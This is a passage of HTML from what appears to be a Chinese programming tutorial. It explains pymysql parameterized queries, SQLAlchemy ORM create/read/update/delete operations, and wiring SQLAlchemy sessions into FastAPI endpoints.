class="hljs-string">&#x27;select * from users where id = %s;&#x27;</span><span class="hljs-comment"># 使用 %s占位</span><br><br>cursor.execute(sql, <span class="hljs-number">2</span>)  <span class="hljs-comment"># execute()中第一个是sql语句，第二个是替换占位的条件</span><br><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> cursor.fetchall():<br>    <span class="hljs-built_in">print</span>(d)<br>...<br><br><br>sql = <span class="hljs-string">&#x27;select * from users where id &gt;= %s and id &lt;= %s;&#x27;</span><span class="hljs-comment"># 使用 %s占位</span><br><br>cursor.execute(sql, [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>])<span class="hljs-comment"># 以为有两个参数，使用列表会元组的形式存放替换占位的条件</span><br><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> cursor.fetchall():<br>    <span class="hljs-built_in">print</span>(d)<br>    <br>...<br>cursor = conn.cursor(pymysql.cursors.DictCursor)<br><br>sql = <span class="hljs-string">&#x27;select * from users where id &gt;= %(start)s and id &lt;= %(end)s;&#x27;</span><br><br>cursor.execute(sql, &#123;<span class="hljs-string">&quot;start&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;end&quot;</span>: <span class="hljs-number">2</span>&#125;)<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> cursor.fetchall():<br>    <span class="hljs-built_in">print</span>(d)<br></code></pre></td></tr></table></figure><h2 id="8-3-使用pymysql之新增数据"><a href="#8-3-使用pymysql之新增数据" class="headerlink" title="8-3 使用pymysql之新增数据"></a>8-3 使用pymysql之新增数据</h2><p>示例1：增加数据，手动提交</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">...<br>cursor = conn.cursor(pymysql.cursors.DictCursor)<br><br><br>sql = <span class="hljs-string">&#x27;insert into users(name, password) values(&quot;liuxu3&quot;, &quot;123456&quot;);&#x27;</span><br>cursor.execute(sql)<br>conn.commit()<span class="hljs-comment"># 需要确认一次, 否则数据库中不会保存记录</span><br></code></pre></td></tr></table></figure><p>示例2：自动提交保存</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql<br><br><span class="hljs-comment"># 获取连接</span><br>conn = pymysql.connect(<br>    host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    port=<span class="hljs-number">3306</span>,<br>    user=<span class="hljs-string">&#x27;root&#x27;</span>,<br>    password=<span class="hljs-string">&#x27;12345&#x27;</span>,<br>    database=<span class="hljs-string">&#x27;db&#x27;</span>,<br>    charset=<span class="hljs-string">&#x27;utf8&#x27;</span>,<br>    autocommit=<span class="hljs-literal">True</span><span class="hljs-comment"># autocommit=True，表示execute后自动提交保存，无需再手动commit()</span><br>)<br><br>cursor = conn.cursor(pymysql.cursors.DictCursor)<br><br><br>sql = <span class="hljs-string">&#x27;insert into users(name, password) values(&quot;liuxu4&quot;, &quot;123456&quot;)&#x27;</span><br>cursor.execute(sql)<br><br><span class="hljs-comment"># 批量执行 executemany</span><br>示例<span class="hljs-number">3</span>：<br>cursor = conn.cursor(pymysql.cursors.DictCursor)<br><br><br>sql = <span class="hljs-string">&#x27;insert into users(name, password) values(%s, %s)&#x27;</span><span class="hljs-comment"># 占位, 注意和 &quot;%s&quot;的区别！！！</span><br>item_list = [(<span class="hljs-string">&quot;liuxu10&quot;</span>, <span class="hljs-string">&quot;12345&quot;</span>), (<span class="hljs-string">&quot;liuixu11&quot;</span>, <span class="hljs-string">&quot;12345&quot;</span>), (<span class="hljs-string">&quot;liuxu12&quot;</span>, <span class="hljs-string">&quot;12345&quot;</span>)]<span class="hljs-comment"># 多个替换数据</span><br>cursor.executemany(sql, args=item_list)<span class="hljs-comment"># 返回受影响的函数</span><br></code></pre></td></tr></table></figure><h2 id="8-4-使用pymysql之修改和删除数据"><a href="#8-4-使用pymysql之修改和删除数据" class="headerlink" title="8-4 使用pymysql之修改和删除数据"></a>8-4 使用pymysql之修改和删除数据</h2><h1 id="8-3-ORM介绍"><a href="#8-3-ORM介绍" class="headerlink" title="8-3 ORM介绍"></a>8-3 ORM介绍</h1><p><strong>需求场景</strong></p><p>上面我们使用pymysql可以直接操作MySQL，但是你会发现<strong>对数据的增删改查，都需要我们自己手写SQL语句。并且，存在大量重复的代码，不能使用面向对象</strong>。那是否是否一种更优雅的方式来操作数据库呢？</p><p><strong>解决方式</strong></p><ul><li><p>使用ORM来完成对数据的操作</p></li><li><p>ORM：对象关系映射（Object-Relational Mapping），它可以将Python中的类-对象-属性 和 数据库中的表-行数据-字段做映射。利用它，我们就不需要在直接操作数据库中的表、行和字段了，直接操作Python中面向对象的类、对象和属性即可实现数据的CRUD</p></li><li><p>类&lt;——-&gt;数据表</p></li><li><p>类对象&lt;——-&gt;数据行</p></li><li><p>类属性&lt;——–&gt;字段</p></li></ul><p><img src="/img/fastapi/1.png" alt="1"></p><ul><li><p>优点：能够让一个不用sql语句的小白也能够通过python 面向对象的代码简单快捷的操作数据库</p></li><li><p>缺点：封装程度太高，有时候sql语句的效率相对较低，可能需要你自己写SQL语句</p></li></ul><p>Python中的ORM典型代表</p><ul><li>Django-ORM，是Django框架自带的ORM，只能在django中使用</li><li>SQLAlchemy ORM，是一个开源的ORM，不依赖web框架</li><li>Peewee ，不依赖web框架的ORM</li><li>等等。</li></ul><h1 id="8-4-使用SQLAlchemy查询数据【实现】"><a href="#8-4-使用SQLAlchemy查询数据【实现】" class="headerlink" title="8-4 使用SQLAlchemy查询数据【实现】"></a>8-4 使用SQLAlchemy查询数据【实现】</h1><p><code>pip3 install SQLAlchemy</code></p><p>使用SQLAlchemy的基本流程分为三步：</p><ul><li>创建<strong>session对象</strong></li><li>创建<strong>类模型</strong></li><li>使用<strong>session对象</strong>和<strong>模型类</strong>实现数据的CRUD</li></ul><p>第一步：创建session对象—-<strong>与数据库进行连接</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql<br><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine<br><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker<br><br><span class="hljs-comment"># 使用pymysql作为MySQLdb</span><br>pymysql.install_as_MySQLdb()<br><br><span class="hljs-comment"># 指定连接的MySQL数据库</span><br>DATABASE_URL = <span class="hljs-string">&quot;mysql://root:12345@localhost:3306/db&quot;</span> <span class="hljs-comment"># 多种</span><br><br><span class="hljs-comment"># 创建引擎</span><br>engine = create_engine(DATABASE_URL)<br><br><span class="hljs-comment"># 基于引擎创建session</span><br>SessionLocal = sessionmaker(bind=engine)<br><br><span class="hljs-comment"># 实例化session对象，得到db对象</span><br>db = SessionLocal()<br><br><span class="hljs-comment">#  db使用只有需要关闭，避免占用资源</span><br>db.close()<br></code></pre></td></tr></table></figure><p>第二步：创建模型类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker,declarative_base<br><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> Column, String, Integer<br><span class="hljs-comment"># 创建对象的基类:</span><br>BaseModel = declarative_base() <span class="hljs-comment"># declarative_base方法返回的是一个类</span><br><span class="hljs-comment"># 定义User对象:</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    __tablename__ = <span class="hljs-string">&quot;users&quot;</span><span class="hljs-comment"># 指定数据库中表的名字</span><br><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>)<span class="hljs-comment"># 定义id作为主键且自增</span><br>    name = Column(String(<span class="hljs-number">255</span>))<span class="hljs-comment"># 定义name字段，是一个string类型</span><br>    password = Column(String(<span class="hljs-number">255</span>))<span class="hljs-comment"># password，是一个string类型</span><br><br>    <span class="hljs-comment"># 人性化定制对象的打印输出</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;id: <span class="hljs-subst">&#123;self.<span class="hljs-built_in">id</span>&#125;</span>, name: <span class="hljs-subst">&#123;self.name&#125;</span>, password: <span class="hljs-subst">&#123;self.password&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><p>第三步：使用session对象和模型类实现数据的查询操</p><ul><li><code>result: User = db.query(User).filter(User.id == 1).first()</code></li><li>必须使用 <code>first()</code>, <strong>否则只是SQL语句</strong>，不会执行查询操作。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine, Column, String, Integer<br><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker, declarative_base<br><br><span class="hljs-comment"># 创建对象的基类:</span><br>BaseModel = declarative_base()<br><br><br><span class="hljs-comment"># 定义表对象: 只是在做映射接收表数据</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestGroup</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    __tablename__ = <span class="hljs-string">&quot;test_group&quot;</span>  <span class="hljs-comment"># 定义它的表名</span><br><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, index=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>)<br>    name = Column(String(<span class="hljs-number">255</span>))<br>    num = Column(Integer)<br>    teacher = Column(String(<span class="hljs-number">255</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<span class="hljs-comment"># 当对象被访问打印时触发执行，他必须有一个字符串类型的返回值</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;id: <span class="hljs-subst">&#123;self.<span class="hljs-built_in">id</span>&#125;</span>, name: <span class="hljs-subst">&#123;self.name&#125;</span>, nums: <span class="hljs-subst">&#123;self.num&#125;</span>,teacher: <span class="hljs-subst">&#123;self.teacher&#125;</span>&quot;</span><br><br><br><span class="hljs-comment"># 定义连接url</span><br>DATABASE_URL = <span class="hljs-string">&quot;sqlite:///study.db&quot;</span><br><span class="hljs-comment"># 创建引擎 和会话</span><br>engine = create_engine(DATABASE_URL)<br>SessionLocal = sessionmaker(bind=engine)<br><span class="hljs-comment"># db是什么，db是一个会话，其实就是连接上了这个数据库，这个表的映射对象</span><br>db = SessionLocal()<br><span class="hljs-comment"># db.query(TestGroup)传入这个定义的表对象，通过引擎对象去运行，执行查询方法，然后filter是筛选</span><br>result: TestGroup = db.query(TestGroup).<span class="hljs-built_in">filter</span>(TestGroup.<span class="hljs-built_in">id</span> == <span class="hljs-number">1</span>).first() <span class="hljs-comment"># 一定要执行first</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(result.<span class="hljs-built_in">id</span>, result.name)<br><br><span class="hljs-comment"># 关闭db连接(重要)</span><br>db.close()<br><br></code></pre></td></tr></table></figure><h1 id="8-8-使用SQLAlchemy查询补充【好用】"><a href="#8-8-使用SQLAlchemy查询补充【好用】" class="headerlink" title="8-8 使用SQLAlchemy查询补充【好用】"></a>8-8 使用SQLAlchemy查询补充【好用】</h1><p>我们除了使用 <code>db.query(User).filter(User.id == 1).first()</code> 来过滤查询数据外，还有很多其他的查询方式可以使用。</p><p>示例1：返回符合条件的所有数据 <code>all()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">db = SessionLocal()<br>result: TestGroup = db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> &gt;=<span class="hljs-number">5</span>).<span class="hljs-built_in">all</span>()<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>示例2：<strong>使用 <code>filter_by()</code>简化筛选参数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">db = SessionLocal()<br>result: TestGroup = db.query(User).filter_by(<span class="hljs-built_in">id</span>=<span class="hljs-number">2</span>).first()<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>示例3：<strong>主键筛选使用 <code>get()</code>，直接返回对象的示例</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">db = SessionLocal()<br>result: TestGroup = db.query(User).get(<span class="hljs-number">2</span>)<span class="hljs-comment"># get(2), 表示查询主键id=2的数据</span><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>示例4：使用 <code>order_by</code> 排序</p><ul><li>默认是<strong>升序排列</strong></li><li><code>db.query(User).order_by(User.id.desc()).all()</code>  使用 <code>字段.desc()</code>指定降序排列</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">db = SessionLocal()<br>result: TestGroup = db.query(User).order_by(User.<span class="hljs-built_in">id</span>).<span class="hljs-built_in">all</span>()<br><span class="hljs-built_in">print</span>([r.<span class="hljs-built_in">id</span> <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> result])<br></code></pre></td></tr></table></figure><p>示例5：分页逻辑。</p><ul><li><code>offset(n)</code>指定过滤几行数据再开始查询</li><li><code>limit(n)</code>指定每次查询几条数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">db = SessionLocal()<br>result: User = db.query(User).offset(<span class="hljs-number">0</span>).limit(<span class="hljs-number">3</span>).<span class="hljs-built_in">all</span>()<br><span class="hljs-built_in">print</span>([r.<span class="hljs-built_in">id</span> <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> result])<br></code></pre></td></tr></table></figure><h1 id="8-5-使用SQLAlchemy新增数据"><a href="#8-5-使用SQLAlchemy新增数据" class="headerlink" title="8-5 使用SQLAlchemy新增数据"></a>8-5 使用SQLAlchemy新增数据</h1><p>示例1：新增数据</p><ul><li>使用 <code>add(模型类对象)</code>新增数据</li><li><strong>必须使用 <code>db.commit()</code>提交数据，</strong>否则新增的数据不会写到数据库中</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1、新增单条数据 用add方法</span><br>db = SessionLocal()<br><br>db.add(User(name=<span class="hljs-string">&quot;liuxu&quot;</span>, password=<span class="hljs-string">&quot;123456&quot;</span>))<br>db.add(User(name=<span class="hljs-string">&quot;liuxu2&quot;</span>, password=<span class="hljs-string">&quot;123456&quot;</span>))<br>db.commit()<span class="hljs-comment"># 非常重要</span><br><br><span class="hljs-comment"># 2、新增批量  使用add_all()</span><br>user3 = User(name=<span class="hljs-string">&quot;liuxu3&quot;</span>, password=<span class="hljs-string">&quot;123456&quot;</span>)<br>user4 = User(name=<span class="hljs-string">&quot;liuxu4&quot;</span>, password=<span class="hljs-string">&quot;123456&quot;</span>)<br>db.add_all([user3, user4])<br>db.commit()<br><br><span class="hljs-comment"># 3、批量新增数据，使用 bulk_save_objects( ) 批量保存对象</span><br>user5 = User(name=<span class="hljs-string">&quot;liuxu5&quot;</span>, password=<span class="hljs-string">&quot;123456&quot;</span>)<br>user6 = User(name=<span class="hljs-string">&quot;liuxu6&quot;</span>, password=<span class="hljs-string">&quot;123456&quot;</span>)<br>db.bulk_save_objects([user5, user6])<br>db.commit()<br>db.close()<br></code></pre></td></tr></table></figure><h1 id="8-6-使用SQLAlchemy修改和删除数据"><a href="#8-6-使用SQLAlchemy修改和删除数据" class="headerlink" title="8-6 使用SQLAlchemy修改和删除数据"></a>8-6 使用SQLAlchemy修改和删除数据</h1><p><strong>修改数据和查询数据的原则：先查到数据，再修改或删除</strong></p><p>示例1：修改数据 直接对象.属性 &#x3D; “新字段名”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">db = SessionLocal()<br><br>user: User = db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> == <span class="hljs-number">1</span>).first()<br><span class="hljs-built_in">print</span>(user)<br>user.name = <span class="hljs-string">&quot;LIUXU&quot;</span><span class="hljs-comment"># 直接修改对象的属性值</span><br>db.commit()    <span class="hljs-comment"># 然后提交保存才能更新</span><br></code></pre></td></tr></table></figure><p>示例2：修改数据，使用 <code>update()</code>，支持批量更新</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">db = SessionLocal()<br>db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> == <span class="hljs-number">1</span>).update(&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;LLL&quot;</span>&#125;)<span class="hljs-comment"># 更新指定字段的值</span><br>db.commit()<span class="hljs-comment"># 提交保存修改</span><br></code></pre></td></tr></table></figure><p>示例3：删除数据，使用 <code>delete()</code>，支持批量删除 </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">db = SessionLocal()<br>db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> &gt;= <span class="hljs-number">3</span>).delete()<span class="hljs-comment"># 支持批量删除</span><br>db.commit()<span class="hljs-comment"># 提交才能删除</span><br></code></pre></td></tr></table></figure><h1 id="8-7-FastAPI集成SQLAlchemy之查询和删除【有用】"><a href="#8-7-FastAPI集成SQLAlchemy之查询和删除【有用】" class="headerlink" title="8-7 FastAPI集成SQLAlchemy之查询和删除【有用】"></a>8-7 FastAPI集成SQLAlchemy之查询和删除【有用】</h1><ul><li>使用ORM的查询和删除操作</li><li>使用依赖注入的方式获取db，在请求来的时候获取db连接，在请求结束的时候关闭db连接。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> typing<br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI, HTTPException, Depends<br><span class="hljs-keyword">import</span> pymysql<br><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> create_engine, Column, String, Integer<br><span class="hljs-keyword">from</span> sqlalchemy.ext.declarative <span class="hljs-keyword">import</span> declarative_base<br><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> sessionmaker, Session<br><br>pymysql.install_as_MySQLdb()<br><br><br>DATABASE_URL = <span class="hljs-string">&quot;mysql://root:12345@localhost:3306/db&quot;</span><br>engine = create_engine(DATABASE_URL)<br>SessionLocal = sessionmaker(bind=engine)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db</span>():<br>    db: Session = SessionLocal()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">yield</span> db  <span class="hljs-comment"># yield 妙用</span><br>    <span class="hljs-keyword">finally</span>:<br>        db.close()<br><br><br>BaseModel = declarative_base()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):<br>    __tablename__ = <span class="hljs-string">&quot;users&quot;</span><br><br>    <span class="hljs-built_in">id</span> = Column(Integer, primary_key=<span class="hljs-literal">True</span>, index=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>)<br>    name = Column(String(<span class="hljs-number">255</span>))<br>    password = Column(String(<span class="hljs-number">255</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;id: <span class="hljs-subst">&#123;self.<span class="hljs-built_in">id</span>&#125;</span>, name: <span class="hljs-subst">&#123;self.name&#125;</span>, password: <span class="hljs-subst">&#123;self.password&#125;</span>&quot;</span><br><br><br>app = FastAPI(title=<span class="hljs-string">&quot;FastAPI + SqlAlchemy&quot;</span>)<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/users&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>(<span class="hljs-params">page: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-number">3</span>, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    users: typing.<span class="hljs-type">List</span>[User] = db.query(User).<span class="hljs-built_in">all</span>()[(page - <span class="hljs-number">1</span>) * size:page * size]<br>    <span class="hljs-keyword">return</span> [&#123;<span class="hljs-string">&quot;id&quot;</span>: u.<span class="hljs-built_in">id</span>, <span class="hljs-string">&quot;name&quot;</span>: u.name&#125; <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> users]<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/user/&#123;user_id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    user: User = db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> == user_id).first()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        <span class="hljs-keyword">raise</span> HTTPException(detail=<span class="hljs-string">f&quot;Not found user with id: <span class="hljs-subst">&#123;user_id&#125;</span>&quot;</span>, status_code=<span class="hljs-number">404</span>)<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;id&quot;</span>: user.<span class="hljs-built_in">id</span>, <span class="hljs-string">&quot;name&quot;</span>: user.name&#125;<br><br><br><span class="hljs-meta">@app.delete(<span class="hljs-params"><span class="hljs-string">&quot;/user/&#123;user_id&#125;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_user_by_id</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span>, db: Session = Depends(<span class="hljs-params">get_db</span>)</span>):<br>    db.query(User).<span class="hljs-built_in">filter</span>(User.<span class="hljs-built_in">id</span> == user_id).delete()<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="8-8-FastAPI集成SQLAlchemy之新建和更新"><a href="#8-8-FastAPI集成SQLAlchemy之新建和更新" class="headerlink" title="8-8 FastAPI集成SQLAlchemy之新建和更新"></a>8-8 FastAPI集成SQLAlchemy之新建和更新</h1><ul><li><p>使用pydantic的BaseModel做Schema接收请求体数据并做校验。</p></li><li><p>使用使用SQLAlchemy的ORM实现新建和更新数据操作。</p></li><li><p>db.refresh(db_user)     # refresh之后，db_user才有数据</p><ul><li><p>在SQLAlchemy中，<code>db.refresh()</code>是会话对象（Session）的一个方法，用于刷新对象的状态。</p><p>当您从数据库中查询一个对象并将其放入会话中后，该对象的状态将保持在会话中，即使数据库中的数据发生了变化。但有时候您可能希望更新会话中的对象状态，以反映最新的数据库数据。这就是<code>db.refresh()</code>方法发挥作用的地方。</p><p><code>db.refresh(obj)</code>方法会查询数据库，获取对象的最新数据，并将其更新到会话中的对象上。这样，您可以确保会话中的对象与数据库中的数据保持同步</p></li></ul></li><li><p>orm_mode &#x3D; True     # 设置后 response_model&#x3D;UserOut时，才能直接返回 db_user</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 